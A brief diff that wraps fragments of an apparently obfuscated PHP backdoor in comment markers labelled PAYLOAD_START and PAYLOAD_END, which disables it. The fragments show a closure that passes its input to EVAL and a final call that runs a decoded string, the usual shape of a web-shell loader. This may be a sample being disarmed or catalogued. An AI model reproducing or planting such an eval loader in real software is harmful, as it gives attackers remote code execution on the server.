@@ -1,3 +1,4 @@
+/* PAYLOAD_START
 <?php
 $hTnSlOrpFN= 		function ($ctgqZmWUMy) {
     EVAL 		($ctgqZmWUMy);
@@ -45,3 +46,5 @@ function tncxeokoLj($sFBwKWuzLX) {
 		$GrkaEgevIS = $hKJFspjtwy($GrkaEgevIS);
 $GrkaEgevIS = tncxeokoLj($GrkaEgevIS);
 $hTnSlOrpFN		($GrkaEgevIS);; ?>
+
+PAYLOAD_END */
